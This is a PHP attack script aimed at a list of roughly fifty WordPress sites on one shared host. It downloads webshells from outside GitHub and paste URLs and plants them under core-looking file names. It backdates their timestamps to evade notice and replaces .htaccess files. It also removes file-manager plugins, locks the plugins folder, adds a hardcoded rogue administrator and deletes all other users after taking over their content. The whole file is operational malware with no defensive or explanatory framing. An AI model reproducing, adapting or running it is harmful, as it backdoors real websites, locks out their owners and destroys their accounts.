<?php

$targetDate = strtotime('2000-01-01 01:01:01');

function downloadFile($url, $path) {
    global $targetDate;

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($ch);
    if ($content === false) {
        die("Failed to download content from $url: " . curl_error($ch));
    }
    curl_close($ch);

    $result = file_put_contents($path, $content);
    if ($result === false) {
        die("Failed to write content to $path");
    }
    touch($path, $targetDate, $targetDate);
    echo "File $path created successfully.\n";
}

function createHtaccess($directory, $url) {
    global $targetDate;
    if (!is_dir($directory)) {
        die("$directory does not exist.");
    }

    $path = $directory . '/.htaccess';
    downloadFile($url, $path);
    touch($path, $targetDate, $targetDate);
}

function deleteUser($username) {
    global $wpdb;
    $user = get_user_by('login', $username);
    if ($user) {
        require_once(ABSPATH . 'wp-admin/includes/user.php');
        wp_delete_user($user->ID);
        echo "User $username deleted successfully.\n";
    } else {
        echo "User $username not found.\n";
    }
}

function addUser() {
    global $wpdb;
    
    $new_user_data = array(
        'user_login' => 'administrator',
        'user_pass' => 'Haikalsiregar162awikwok1337', 
        'user_email' => 'inboxnotificationow@gmail.com',
        'role' => 'administrator' 
    );

    $user_id = wp_insert_user($new_user_data);

    if (!is_wp_error($user_id)) {
        echo "User added successfully.\n";
    } else {
        echo "Oops, something went wrong.\n";
    }
}

function reassignContentAndDeleteUsers() {
    global $wpdb;

    $new_admin = get_user_by('login', 'administrator');
    if (!$new_admin) {
        die("New administrator user not found.");
    }
    $new_admin_id = $new_admin->ID;

    $users = get_users(array('exclude' => array($new_admin_id)));

    foreach ($users as $user) {
        $args = array(
            'post_author' => $new_admin_id,
            'post_type' => 'any',
            'posts_per_page' => -1,
            'author' => $user->ID
        );
        $user_posts = get_posts($args);

        foreach ($user_posts as $post) {
            wp_update_post(array(
                'ID' => $post->ID,
                'post_author' => $new_admin_id
            ));
        }

        wp_delete_user($user->ID, $new_admin_id);
        echo "User {$user->user_login} content reassigned and deleted.\n";
    }

    echo "All content reassigned and old users deleted successfully.\n";
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir) || is_link($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . "/" . $item)) {
            chmod($dir . "/" . $item, 0777);
            if (!deleteDirectory($dir . "/" . $item)) return false;
        }
    }
    return rmdir($dir);
}

$websiteDirs = [
"/home/u1577349/public_html/nurhayatie156.digitalsolutions.id/",
"/home/u1577349/public_html/ekayunisapitri.digitalsolutions.id/",
"/home/u1577349/public_html/nabilah.digitalsolutions.id/",
"/home/u1577349/public_html/ryan.digitalsolutions.id/",
"/home/u1577349/public_html/faridkasimjudas.pkbmanugerahindonesia.sch.id/",
"/home/u1577349/public_html/digitalsolutions.id/",
"/home/u1577349/public_html/siti-badriah-sb7.digitalsolutions.id/",
"/home/u1577349/public_html/rha-amah.digitalsolutions.id/",
"/home/u1577349/public_html/ifungarfn146.digitalsolutions.id/",
"/home/u1577349/public_html/haryatisd03.digitalsolutions.id/",
"/home/u1577349/public_html/harditacitra.digitalsolutions.id/",
"/home/u1577349/public_html/arwin.digitalsolutions.id/",
"/home/u1577349/public_html/z-helmi91.digitalsolutions.id/",
"/home/u1577349/public_html/sitimariyam-panmas2.digitalsolutions.id/",
"/home/u1577349/public_html/indahsariefi293.digitalsolutions.id/",
"/home/u1577349/public_html/amalahnur59.digitalsolutions.id/",
"/home/u1577349/public_html/milafebriharyanii.digitalsolutions.id/",
"/home/u1577349/public_html/sitisumiati.digitalsolutions.id/",
"/home/u1577349/public_html/wawangwangsih7.digitalsolutions.id/",
"/home/u1577349/public_html/portofolio/",
"/home/u1577349/public_html/ikanakasha123.digitalsolutions.id/",
"/home/u1577349/public_html/linarifah26.digitalsolutions.id/",
"/home/u1577349/public_html/helwanihela30.digitalsolutions.id/",
"/home/u1577349/public_html/martini-tinispd.digitalsolutions.id/",
"/home/u1577349/public_html/windiarsihtutu.digitalsolutions.id/",
"/home/u1577349/public_html/kakputra.digitalsolutions.id/",
"/home/u1577349/public_html/arlindkate.digitalsolutions.id/",
"/home/u1577349/public_html/elfiyarni35.digitalsolutions.id/",
"/home/u1577349/public_html/istinnarakhmalia1284.digitalsolutions.id/",
"/home/u1577349/public_html/dinanoviyanti15.digitalsolutions.id/",
"/home/u1577349/public_html/dalmok.digitalsolutions.id/",
"/home/u1577349/public_html/ardi77.digitalsolutions.id/",
"/home/u1577349/public_html/haryatinigsih.digitalsolutions.id/",
"/home/u1577349/public_html/tianoersantoso.digitalsolutions.id/",
"/home/u1577349/public_html/sari.digitalsolutions.id/",
"/home/u1577349/public_html/",
"/home/u1577349/public_html/menoli-moho.digitalsolutions.id/",
"/home/u1577349/public_html/fitricantik.digitalsolutions.id/",
"/home/u1577349/public_html/suarsih.digitalsolutions.id/",
"/home/u1577349/public_html/syifauziah.digitalsolutions.id/",
"/home/u1577349/public_html/marno.digitalsolutions.id/",
"/home/u1577349/public_html/enggal.digitalsolutions.id/",
"/home/u1577349/public_html/diahagustiani.digitalsolutions.id/",
"/home/u1577349/public_html/yocemna.digitalsolutions.id/",
"/home/u1577349/public_html/kristinedisudrjat.digitalsolutions.id/",
"/home/u1577349/public_html/billnof.digitalsolutions.id/",
"/home/u1577349/public_html/mitra1989.digitalsolutions.id/",
"/home/u1577349/public_html/ikayuli79-iy.digitalsolutions.id/",
"/home/u1577349/public_html/retnosusilowati.digitalsolutions.id/",
"/home/u1577349/public_html/atriyosi79.digitalsolutions.id/",
"/home/u1577349/public_html/edionci1990.digitalsolutions.id/",
];

foreach ($websiteDirs as $nowdir) {
    echo "Processing $nowdir\n";

    require_once($nowdir . '/wp-config.php');

    $autoloadPath = $nowdir . '/wp-includes/autoload.php';
    downloadFile('https://raw.githubusercontent.com/justikail/webshell/main/fgetv3.php', $autoloadPath);
    $wpadmin1 = $nowdir . '/wp-admin/includes/about.php';
    downloadFile('https://raw.githubusercontent.com/justikail/webshell/main/fgetv3.php', $wpadmin1);
    $wpadmin2 = $nowdir . '/wp-admin/network/link.php';
    downloadFile('https://raw.githubusercontent.com/justikail/webshell/main/fgetv3.php', $wpadmin2);
    $wpadmin3 = $nowdir . '/wp-admin/network/comment.php';
    downloadFile('https://raw.githubusercontent.com/justikail/webshell/main/fgetv3.php', $wpadmin3);
    $classWpLoginPath = $nowdir . '/wp-includes/class-wp-login.php';
    downloadFile('https://paste.zone-xsec.com/raw/psRDuM', $classWpLoginPath);
    $classWpAdminPath = $nowdir . '/wp-admin/includes/class-wp-login.php';
    downloadFile('https://paste.zone-xsec.com/raw/USssHy', $classWpAdminPath);
    createHtaccess($nowdir . '/wp-includes', 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess_wpincludes');
    createHtaccess($nowdir . '/wp-content', 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess_wpcontent');

    $wpFileManagerPath = $nowdir . '/wp-content/plugins/wp-file-manager';
    $fileManagerAdvancedPath = $nowdir . '/wp-content/plugins/file-manager-advanced';
    $wpPluginsPath = $nowdir . '/wp-content/plugins';

    if (is_dir($wpFileManagerPath)) {
        if (deleteDirectory($wpFileManagerPath)) {
            echo "Directory $wpFileManagerPath deleted successfully.\n";
        } else {
            die("Failed to delete directory $wpFileManagerPath.");
        }
    }

    if (is_dir($fileManagerAdvancedPath)) {
        if (deleteDirectory($fileManagerAdvancedPath)) {
            echo "Directory $fileManagerAdvancedPath deleted successfully.\n";
        } else {
            die("Failed to delete directory $fileManagerAdvancedPath.");
        }
    }

    if (chmod($wpPluginsPath, 0555)) {
        echo "Directory $wpPluginsPath chmod to 555 successfully.\n";
    } else {
        die("Failed to chmod directory $wpPluginsPath.");
    }

    createHtaccess($nowdir . '/wp-admin', 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess_wpadmin');
    createHtaccess($nowdir, 'https://raw.githubusercontent.com/justikail/webshell/main/hidden/.htaccess');

    deleteUser('administrator');
    addUser();
    reassignContentAndDeleteUsers();
}

?>
